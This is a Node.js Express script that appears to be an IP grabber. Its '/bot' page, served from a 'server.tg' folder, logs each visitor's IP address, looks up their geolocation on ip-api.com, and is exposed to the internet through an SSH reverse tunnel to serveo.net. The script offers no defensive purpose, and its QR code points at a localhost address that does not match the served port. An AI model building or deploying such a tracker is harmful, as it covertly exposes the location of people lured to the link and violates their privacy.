const colors = require("colors");
const express = require("express");
const fs = require('fs');
const path = require("path");
const qrcode = require("qrcode-terminal");
const { spawn } = require('child_process');
const app = express();
const http = require('http');
const port = "4040";
const server = "http://localhost:8080";
console.log("Hi, user. welcome to script main.js".white.bold);
const host = "127.0.1"

app.use(express.static('server.tg'));

app.get(('/bot'), (req, res)  => {
const userIp = req.headers['x-forwarded-for'] || req.ip;
console.log('[!] New IP '.white.bold, userIp.green.bold);
http.get(`http://ip-api.com/json/${userIp}`, (resp) => {
let data = '';

resp.on('data', (chunk) => {
data += chunk;
});
resp.on('end', () => {
const parsedData = JSON.parse(data);
const formattedData = JSON.stringify(parsedData, null, 2);
console.log(formattedData.yellow.bold);
})
})

res.sendFile(__dirname + '/server.tg/index.html');
});

app.get('/server', (req, res) => {
res.sendFile(path.join(__dirname, 'server.tg', 'index.html'));
});

app.get('/ico', (req, res) => {
res.sendFile(path.join(__dirname, 'server.tg', 'favicon.ico'))
});

qrcode.generate(server, {small: true}, function(qrcode) {
console.log(qrcode);
});

app.listen(port, host, () => {
console.log(`[+] Server Running in PORT =>`.white.bold +` ${port}`.yellow.bold);
    const sshProcess = spawn('ssh', ['-R', '80:localhost:4040', 'serveo.net'], { stdio: 'inherit' });

    sshProcess.on('close', (code) => {
        console.log(` SSH code ${code}`);
    });
})
